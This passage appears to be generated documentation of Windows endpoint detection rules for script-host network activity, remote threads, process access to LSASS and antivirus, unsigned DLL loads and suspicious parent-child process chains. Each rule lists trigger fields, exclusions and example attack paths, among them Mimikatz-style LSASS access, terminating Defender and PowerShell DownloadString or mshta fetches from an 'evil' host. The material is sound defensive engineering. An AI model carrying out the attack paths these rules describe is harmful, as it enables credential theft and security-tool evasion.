  - Path B: cscript DNS — image=...\cscript.exe; query_name=any
  - Path C: mshta DNS — image=...\mshta.exe; query_name=any
- TP/FP boundary: Any DNS query event from wscript/cscript/mshta fires; no query_name or hostname filters.
- Subphase: NEEDS CLARIFICATION: YAML has no subphase field; definition file is network.yaml

## RULE: NET_SCRIPT_ENGINE_OUTBOUND_001
- File: rules/definitions/network.yaml
- Category: Network
- Detection logic: NetworkConnect where image ends with \wscript.exe, \cscript.exe, or \mshta.exe AND initiated is true.
- Required fields to trigger:
  - image: ends_with_any "\wscript.exe" | "\cscript.exe" | "\mshta.exe"
  - initiated: equals "true"
- Optional fields:
  - (none)
- Known exclusion conditions:
  - (none)
- Attack paths (minimum 3):
  - Path A: wscript outbound — image=C:\Windows\System32\wscript.exe; initiated=true
  - Path B: cscript outbound — image=C:\Windows\System32\cscript.exe; initiated=true
  - Path C: mshta outbound — image=C:\Windows\System32\mshta.exe; initiated=true
- TP/FP boundary: Any initiated network connect from path-suffixed wscript/cscript/mshta fires; powershell intentionally not covered here.
- Subphase: NEEDS CLARIFICATION: YAML has no subphase field; definition file is network.yaml

## RULE: API_CRT_SUSPICIOUS_SOURCE_001
- File: rules/definitions/api_memory.yaml
- Category: API/Memory
- Detection logic: CreateRemoteThread where source_image ends with a listed suspicious process AND source_image does not contain the pipeline python path.
- Required fields to trigger:
  - source_image: ends_with_any "\winword.exe" | "\excel.exe" | "\powerpnt.exe" | "\outlook.exe" | "\lync.exe" | "\mspaint.exe" | "\powershell.exe" | "\wscript.exe" | "\mshta.exe" | "\msiexec.exe" | "\regsvr32.exe" | "\wmic.exe" | "\installutil.exe" | "\schtasks.exe" | "\iexplore.exe" | "\msbuild.exe" | "\cvtres.exe" | "\vssadmin.exe" | "\find.exe" | "\findstr.exe" | "\forfiles.exe" | "\expand.exe" | "\defrag.exe" | "\ping.exe" | "\robocopy.exe" | "\makecab.exe" | "\gpupdate.exe" | "\hh.exe" | "\explorer.exe" | "\monitoringhost.exe"
- Optional fields:
  - (none)
- Known exclusion conditions:
  - source_image: not_contains "python_runtime\python.exe"
- Attack paths (minimum 3):
  - Path A: Office CRT — source_image=...\WINWORD.EXE; target_image=any/unresolved
  - Path B: PowerShell CRT — source_image=...\powershell.exe; target_image=any
  - Path C: mshta CRT — source_image=...\mshta.exe; target_image=any
- TP/FP boundary: CRT from listed suspicious sources fires regardless of target; suppressed only when source path contains python_runtime\python.exe.
- Subphase: NEEDS CLARIFICATION: YAML has no subphase field; definition file is api_memory.yaml

## RULE: API_CRT_SENSITIVE_TARGET_001
- File: rules/definitions/api_memory.yaml
- Category: API/Memory
- Detection logic: CreateRemoteThread where target is lsass/winlogon/csrss AND source is outside known-benign system sources and not the pipeline python path.
- Required fields to trigger:
  - target_image: ends_with_any "\lsass.exe" | "\winlogon.exe" | "\csrss.exe"
- Optional fields:
  - (none)
- Known exclusion conditions:
  - source_image: not_ends_with_any "\csrss.exe" | "\werfault.exe" | "\svchost.exe" | "\wmiprvse.exe" | "\vmtoolsd.exe" | "\MsMpEng.exe" | "\lsass.exe" | "\winlogon.exe" | "\wininit.exe" | "\services.exe"
  - source_image: not_contains "python_runtime\python.exe"
- Attack paths (minimum 3):
  - Path A: Unknown binary → lsass — target_image=...\lsass.exe; source_image=C:\Users\Public\inj.exe
  - Path B: powershell → winlogon — target_image=...\winlogon.exe; source_image=...\powershell.exe
  - Path C: custom → csrss — target_image=...\csrss.exe; source_image=C:\Temp\loader.exe
- TP/FP boundary: CRT into sensitive targets fires unless source ends with listed benign system images or contains pipeline python path.
- Subphase: NEEDS CLARIFICATION: YAML has no subphase field; definition file is api_memory.yaml

## RULE: API_OPEN_PROCESS_SUSPICIOUS_ACCESS_001
- File: rules/definitions/api_memory.yaml
- Category: API/Memory
- Detection logic: ProcessAccess where granted_access has suspicious access-mask bits AND target is lsass/winlogon/csrss AND source is outside benign exclusions.
- Required fields to trigger:
  - granted_access: bits_any_set "0x1f0fff" | "0x1410" | "0x1fffff"
  - target_image: ends_with_any "lsass.exe" | "winlogon.exe" | "csrss.exe"
- Optional fields:
  - (none)
- Known exclusion conditions:
  - source_image: not_ends_with_any "MsMpEng.exe" | "\Windows\System32\csrss.exe" | "\Windows\System32\lsass.exe" | "\Windows\System32\winlogon.exe" | "\Windows\System32\wininit.exe" | "\Windows\System32\svchost.exe" | "\Windows\System32\wbem\wmiprvse.exe" | "\Program Files\VMware\VMware Tools\vmtoolsd.exe"
- Attack paths (minimum 3):
  - Path A: Mimikatz-style ALL_ACCESS to lsass — granted_access=0x1f0fff; target_image=...\lsass.exe; source_image=C:\Users\Public\mim.exe
  - Path B: 0x1410 to winlogon — granted_access=0x1410; target_image=...\winlogon.exe; source_image=...\powershell.exe
  - Path C: 0x1fffff to csrss — granted_access=0x1fffff; target_image=...\csrss.exe; source_image=C:\Temp\tool.exe
- TP/FP boundary: Broad access to sensitive targets fires unless source ends with listed Defender/system/VMware paths.
- Subphase: NEEDS CLARIFICATION: YAML has no subphase field; definition file is api_memory.yaml

## RULE: API_DLL_LOAD_SUSPICIOUS_PATH_001
- File: rules/definitions/api_memory.yaml
- Category: API/Memory
- Detection logic: ImageLoad where image_loaded path is under a user-writable staging location AND signed equals false.
- Required fields to trigger:
  - image_loaded: contains_any "\temp\" | "\appdata\local\temp\" | "\appdata\roaming\" | "\downloads\" | "\programdata\" | "c:\users\public\"
  - signed: equals "false"
- Optional fields:
  - (none)
- Known exclusion conditions:
  - (none)
- Attack paths (minimum 3):
  - Path A: Unsigned DLL in Temp — image_loaded=C:\Users\bob\AppData\Local\Temp\evil.dll; signed=false
  - Path B: Unsigned DLL in Downloads — image_loaded=C:\Users\bob\Downloads\stage.dll; signed=false
  - Path C: Unsigned DLL in Public — image_loaded=c:\users\public\evil.dll; signed=false
- TP/FP boundary: Unsigned DLLs from listed staging paths fire; signed DLLs or loads outside those path substrings do not.
- Subphase: NEEDS CLARIFICATION: YAML has no subphase field; definition file is api_memory.yaml

## RULE: API_LOLBIN_DLL_UNSIGNED_001
- File: rules/definitions/api_memory.yaml
- Category: API/Memory
- Detection logic: ImageLoad where a listed LOLBin loads a DLL with signed equals false.
- Required fields to trigger:
  - image: ends_with_any "rundll32.exe" | "regsvr32.exe" | "mshta.exe" | "msiexec.exe" | "cmstp.exe"
  - signed: equals "false"
- Optional fields:
  - (none)
- Known exclusion conditions:
  - (none)
- Attack paths (minimum 3):
  - Path A: rundll32 unsigned DLL — image=...\rundll32.exe; signed=false; image_loaded=any
  - Path B: regsvr32 unsigned DLL — image=...\regsvr32.exe; signed=false
  - Path C: mshta unsigned DLL — image=...\mshta.exe; signed=false
- TP/FP boundary: Any unsigned DLL load by listed LOLBins fires regardless of DLL path.
- Subphase: NEEDS CLARIFICATION: YAML has no subphase field; definition file is api_memory.yaml

## RULE: API_OPEN_PROCESS_VM_WRITE_001
- File: rules/definitions/api_memory.yaml
- Category: API/Memory
- Detection logic: ProcessAccess where granted_access has VM_WRITE-capable masks AND source/target basename differ AND source/target/call_trace are outside exclusion sets.
- Required fields to trigger:
  - granted_access: bits_any_set "0x0028" | "0x001f0fff"
- Optional fields:
  - call_trace: allow_null true — missing call_trace still satisfies not_contains_any exclusion
- Known exclusion conditions:
  - source_image: not_ends_with_any "MsMpEng.exe" | "\Windows\System32\csrss.exe" | "\Windows\System32\lsass.exe" | "\Windows\System32\winlogon.exe" | "\Windows\System32\wininit.exe" | "\Windows\System32\werfault.exe" | "\Windows\System32\svchost.exe" | "\Windows\System32\services.exe" | "\Windows\Sysmon64.exe" | "\Windows\System32\runonce.exe" | "\Windows\System32\conhost.exe" | "\Windows\System32\cmd.exe"
  - source_image: not_same_basename target_image
  - target_image: not_ends_with_any "\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" | "\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe"
  - call_trace: not_contains_any "System.Management.Automation.ni.dll" | "Microsoft.PowerShell.Commands.Management.ni.dll" | "System.Management.Automation.dll"
- Attack paths (minimum 3):
  - Path A: Cross-process VM_WRITE — granted_access=0x0028; source_image=C:\Users\Public\inj.exe; target_image=C:\Windows\System32\notepad.exe; call_trace=null or non-PS
  - Path B: PROCESS_ALL_ACCESS injection — granted_access=0x001f0fff; source_image=...\powershell.exe; target_image=...\notepad.exe; call_trace without Automation DLLs
  - Path C: LOLBin → browser — granted_access=0x0028; source_image=...\mshta.exe; target_image=...\msedge.exe
- TP/FP boundary: VM_WRITE-capable access fires only when source≠target basename and source/target/call_trace avoid listed benign exclusions.
- Subphase: NEEDS CLARIFICATION: YAML has no subphase field; definition file is api_memory.yaml

## RULE: API_TOKEN_MANIPULATION_001
- File: rules/definitions/api_memory.yaml
- Category: API/Memory
- Detection logic: ProcessAccess where granted_access has DUP_HANDLE-related bits AND target is lsass/winlogon/services AND source is outside benign exclusions.
- Required fields to trigger:
  - granted_access: bits_any_set "0x0040" | "0x0440" | "0x1440"
  - target_image: ends_with_any "lsass.exe" | "winlogon.exe" | "services.exe"
- Optional fields:
  - (none)
- Known exclusion conditions:
  - source_image: not_ends_with_any "msmpeng.exe" | "csrss.exe" | "lsass.exe" | "winlogon.exe" | "wininit.exe"
- Attack paths (minimum 3):
  - Path A: DUP_HANDLE to lsass — granted_access=0x0040; target_image=...\lsass.exe; source_image=C:\Users\Public\tok.exe
  - Path B: 0x0440 to winlogon — granted_access=0x0440; target_image=...\winlogon.exe; source_image=...\powershell.exe
  - Path C: 0x1440 to services — granted_access=0x1440; target_image=...\services.exe; source_image=C:\Temp\incognito.exe
- TP/FP boundary: DUP_HANDLE-family access to privileged targets fires unless source ends with listed system/Defender basenames.
- Subphase: NEEDS CLARIFICATION: YAML has no subphase field; definition file is api_memory.yaml

## RULE: API_AV_PROCESS_ACCESS_001
- File: rules/definitions/api_memory.yaml
- Category: API/Memory
- Detection logic: ProcessAccess where target is a listed AV/security process AND granted_access has terminate or VM_WRITE bits AND source is outside system/updater exclusions.
- Required fields to trigger:
  - target_image: ends_with_any "msmpeng.exe" | "mpcmdrun.exe" | "avgnt.exe" | "avp.exe" | "bdagent.exe" | "ekrn.exe" | "sentinelagent.exe" | "cylancesvc.exe" | "cb.exe"
  - granted_access: bits_any_set "0x0001" | "0x0020"
- Optional fields:
  - (none)
- Known exclusion conditions:
  - source_image: not_ends_with_any "msmpeng.exe" | "svchost.exe" | "services.exe" | "trustedinstaller.exe" | "tiworker.exe" | "sgrmbroker.exe" | "wuauclt.exe" | "csrss.exe" | "conhost.exe" | "lsass.exe" | "winlogon.exe" | "wininit.exe"
- Attack paths (minimum 3):
  - Path A: Terminate Defender — target_image=...\MsMpEng.exe; granted_access=0x0001; source_image=C:\Users\Public\killer.exe
  - Path B: VM_WRITE to AV — target_image=...\ekrn.exe; granted_access=0x0020; source_image=...\powershell.exe
  - Path C: Terminate Sentinel — target_image=...\SentinelAgent.exe; granted_access=0x0001; source_image=C:\Temp\tool.exe
- TP/FP boundary: Terminate/VM_WRITE access to listed AV processes fires unless source ends with listed Windows/updater/system images.
- Subphase: NEEDS CLARIFICATION: YAML has no subphase field; definition file is api_memory.yaml

## RULE: CHAIN_OFFICE_POWERSHELL_001
- File: rules/definitions/parent_child.yaml
- Category: Parent-Child
- Detection logic: ProcessCreate where parent_image is an Office app AND image is powershell.exe.
- Required fields to trigger:
  - parent_image: contains_any "winword.exe" | "excel.exe" | "powerpnt.exe" | "outlook.exe" | "onenote.exe"
  - image: ends_with "powershell.exe"
- Optional fields:
  - (none)
- Known exclusion conditions:
  - (none)
- Attack paths (minimum 3):
  - Path A: Word macro → PS — parent_image=...\WINWORD.EXE; image=...\powershell.exe
  - Path B: Excel macro → PS — parent_image=...\EXCEL.EXE; image=...\powershell.exe
  - Path C: Outlook → PS — parent_image=...\OUTLOOK.EXE; image=...\powershell.exe
- TP/FP boundary: Any Office→powershell.exe process create fires; no command-line filters.
- Subphase: NEEDS CLARIFICATION: YAML has no subphase field; definition file is parent_child.yaml

## RULE: CHAIN_OFFICE_CMD_001
- File: rules/definitions/parent_child.yaml
- Category: Parent-Child
- Detection logic: ProcessCreate where parent_image is an Office app AND image is cmd.exe.
- Required fields to trigger:
  - parent_image: contains_any "winword.exe" | "excel.exe" | "powerpnt.exe" | "outlook.exe" | "onenote.exe"
  - image: ends_with "cmd.exe"
- Optional fields:
  - (none)
- Known exclusion conditions:
  - (none)
- Attack paths (minimum 3):
  - Path A: Word → cmd — parent_image=...\WINWORD.EXE; image=...\cmd.exe
  - Path B: Excel → cmd — parent_image=...\EXCEL.EXE; image=...\cmd.exe
  - Path C: PowerPoint → cmd — parent_image=...\POWERPNT.EXE; image=...\cmd.exe
- TP/FP boundary: Any Office→cmd.exe process create fires; no command-line filters.
- Subphase: NEEDS CLARIFICATION: YAML has no subphase field; definition file is parent_child.yaml

## RULE: CHAIN_SCRIPT_HOST_CMD_001
- File: rules/definitions/parent_child.yaml
- Category: Parent-Child
- Detection logic: ProcessCreate where parent is wscript/cscript AND child is cmd.exe.
- Required fields to trigger:
  - parent_image: contains_any "wscript.exe" | "cscript.exe"
  - image: ends_with "cmd.exe"
- Optional fields:
  - (none)
- Known exclusion conditions:
  - (none)
- Attack paths (minimum 3):
  - Path A: wscript → cmd — parent_image=...\wscript.exe; image=...\cmd.exe
  - Path B: cscript → cmd — parent_image=...\cscript.exe; image=...\cmd.exe
  - Path C: wscript from user path → cmd — parent_image=C:\Users\Public\wscript.exe; image=...\cmd.exe
- TP/FP boundary: Any wscript/cscript→cmd.exe create fires; no command-line filters.
- Subphase: NEEDS CLARIFICATION: YAML has no subphase field; definition file is parent_child.yaml

## RULE: CHAIN_SCRIPT_HOST_POWERSHELL_001
- File: rules/definitions/parent_child.yaml
- Category: Parent-Child
- Detection logic: ProcessCreate where parent is wscript/cscript AND child is powershell.exe.
- Required fields to trigger:
  - parent_image: contains_any "wscript.exe" | "cscript.exe"
  - image: ends_with "powershell.exe"
- Optional fields:
  - (none)
- Known exclusion conditions:
  - (none)
- Attack paths (minimum 3):
  - Path A: wscript → powershell — parent_image=...\wscript.exe; image=...\powershell.exe
  - Path B: cscript → powershell — parent_image=...\cscript.exe; image=...\powershell.exe
  - Path C: Nested script host → PS — parent_image=...\cscript.exe; image=C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
- TP/FP boundary: Any wscript/cscript→powershell.exe create fires; no command-line filters.
- Subphase: NEEDS CLARIFICATION: YAML has no subphase field; definition file is parent_child.yaml

## RULE: CHAIN_BROWSER_SHELL_001
- File: rules/definitions/parent_child.yaml
- Category: Parent-Child
- Detection logic: ProcessCreate where parent is a listed browser AND child is a shell or script host.
- Required fields to trigger:
  - parent_image: contains_any "chrome.exe" | "msedge.exe" | "firefox.exe" | "iexplore.exe" | "brave.exe" | "opera.exe" | "microsoftedge.exe"
  - image: ends_with_any "cmd.exe" | "powershell.exe" | "wscript.exe" | "cscript.exe" | "mshta.exe"
- Optional fields:
  - (none)
- Known exclusion conditions:
  - (none)
- Attack paths (minimum 3):
  - Path A: Chrome → cmd — parent_image=...\chrome.exe; image=...\cmd.exe
  - Path B: Edge → powershell — parent_image=...\msedge.exe; image=...\powershell.exe
  - Path C: Firefox → mshta — parent_image=...\firefox.exe; image=...\mshta.exe
- TP/FP boundary: Browser→shell/script-host creates fire; browser→browser helper children do not match child image list.
- Subphase: NEEDS CLARIFICATION: YAML has no subphase field; definition file is parent_child.yaml

## RULE: CHAIN_OFFICE_WSCRIPT_001
- File: rules/definitions/parent_child.yaml
- Category: Parent-Child
- Detection logic: ProcessCreate where parent is an Office app AND child is wscript.exe or cscript.exe.
- Required fields to trigger:
  - parent_image: contains_any "winword.exe" | "excel.exe" | "powerpnt.exe" | "outlook.exe" | "onenote.exe"
  - image: ends_with_any "wscript.exe" | "cscript.exe"
- Optional fields:
  - (none)
- Known exclusion conditions:
  - (none)
- Attack paths (minimum 3):
  - Path A: Word → wscript — parent_image=...\WINWORD.EXE; image=...\wscript.exe
  - Path B: Excel → cscript — parent_image=...\EXCEL.EXE; image=...\cscript.exe
  - Path C: Outlook → wscript — parent_image=...\OUTLOOK.EXE; image=...\wscript.exe
- TP/FP boundary: Any Office→wscript/cscript create fires; no command-line filters.
- Subphase: NEEDS CLARIFICATION: YAML has no subphase field; definition file is parent_child.yaml

## RULE: CHAIN_REGSVR32_CHILD_001
- File: rules/definitions/parent_child.yaml
- Category: Parent-Child
- Detection logic: ProcessCreate where parent is regsvr32.exe AND child is a shell or script host.
- Required fields to trigger:
  - parent_image: ends_with "regsvr32.exe"
  - image: ends_with_any "cmd.exe" | "powershell.exe" | "wscript.exe" | "mshta.exe" | "cscript.exe"
- Optional fields:
  - (none)
- Known exclusion conditions:
  - (none)
- Attack paths (minimum 3):
  - Path A: regsvr32 → cmd — parent_image=...\regsvr32.exe; image=...\cmd.exe
  - Path B: regsvr32 → powershell — parent_image=...\regsvr32.exe; image=...\powershell.exe
  - Path C: regsvr32 → mshta — parent_image=...\regsvr32.exe; image=...\mshta.exe
- TP/FP boundary: regsvr32 spawning listed shells/script hosts fires; other child images do not.
- Subphase: NEEDS CLARIFICATION: YAML has no subphase field; definition file is parent_child.yaml

## RULE: CHAIN_SCHEDULED_TASK_SCRIPT_001
- File: rules/definitions/parent_child.yaml
- Category: Parent-Child
- Detection logic: ProcessCreate where parent is taskeng/taskhostw AND child is a script host AND command_line references a staging path AND command_line does not contain System32 path.
- Required fields to trigger:
  - parent_image: contains_any "taskeng.exe" | "taskhostw.exe"
  - image: ends_with_any "powershell.exe" | "wscript.exe" | "cscript.exe" | "mshta.exe"
  - command_line: contains_any "C:\Users\" | "C:\ProgramData\" | "C:\Windows\Temp\" | "C:\Windows\Tasks\" | "C:\PerfLogs\" | "AppData\"
- Optional fields:
  - (none)
- Known exclusion conditions:
  - command_line: not_contains "C:\Windows\system32\"
- Attack paths (minimum 3):
  - Path A: taskhostw → PS from Users — parent_image=...\taskhostw.exe; image=...\powershell.exe; command_line=...C:\Users\bob\AppData\Local\payload.ps1...
  - Path B: taskeng → wscript from ProgramData — parent_image=...\taskeng.exe; image=...\wscript.exe; command_line=...C:\ProgramData\AppPool.vbs...
  - Path C: taskhostw → cscript from Temp — parent_image=...\taskhostw.exe; image=...\cscript.exe; command_line=...C:\Windows\Temp\a.vbs...
- TP/FP boundary: Scheduler-host→script with staging-path markers fires unless command_line also contains C:\Windows\system32\.
- Subphase: NEEDS CLARIFICATION: YAML has no subphase field; definition file is parent_child.yaml

## RULE: CHAIN_SCHEDULED_TASK_SVCHOST_001
- File: rules/definitions/parent_child.yaml
- Category: Parent-Child
- Detection logic: ProcessCreate where parent is svchost with -s Schedule AND child is a script host AND command_line has network/encoded/IEX markers.
- Required fields to trigger:
  - parent_image: contains_any "svchost.exe"
  - parent_command_line: contains_any "-s Schedule"
  - image: ends_with_any "powershell.exe" | "wscript.exe" | "cscript.exe" | "mshta.exe"
  - command_line: contains_any "http://" | "https://" | "-enc" | "-encoded" | "downloadstring" | "iex" | "invoke-expression" | "frombase64string"
- Optional fields:
  - (none)
- Known exclusion conditions:
  - (none)
- Attack paths (minimum 3):
  - Path A: Schedule → PS encoded — parent_image=...\svchost.exe; parent_command_line=...-s Schedule...; image=...\powershell.exe; command_line=...-enc ...
  - Path B: Schedule → PS download — parent_image=...\svchost.exe; parent_command_line=...-s Schedule...; image=...\powershell.exe; command_line=...DownloadString http://evil...
  - Path C: Schedule → mshta URL — parent_image=...\svchost.exe; parent_command_line=...-s Schedule...; image=...\mshta.exe; command_line=...https://evil/a.hta...
- TP/FP boundary: Only svchost Schedule parents with script children carrying listed network/encoded/IEX markers fire; clean scheduled scripts without those markers do not.
- Subphase: NEEDS CLARIFICATION: YAML has no subphase field; definition file is parent_child.yaml

## RULE: CHAIN_LOLBIN_CHILD_001
- File: rules/definitions/parent_child.yaml
- Category: Parent-Child
- Detection logic: ProcessCreate where parent is a listed high-risk LOLBin AND child is a shell or script host.
- Required fields to trigger:
  - parent_image: ends_with_any "mshta.exe" | "rundll32.exe" | "odbcconf.exe" | "cmstp.exe" | "installutil.exe" | "regasm.exe" | "regsvcs.exe"
  - image: ends_with_any "cmd.exe" | "powershell.exe" | "wscript.exe" | "cscript.exe"
- Optional fields:
  - (none)
- Known exclusion conditions:
  - (none)
- Attack paths (minimum 3):
  - Path A: mshta → cmd — parent_image=...\mshta.exe; image=...\cmd.exe
  - Path B: rundll32 → powershell — parent_image=...\rundll32.exe; image=...\powershell.exe
  - Path C: installutil → wscript — parent_image=...\InstallUtil.exe; image=...\wscript.exe
- TP/FP boundary: Listed LOLBin→shell/script-host creates fire; other child images do not.
- Subphase: NEEDS CLARIFICATION: YAML has no subphase field; definition file is parent_child.yaml
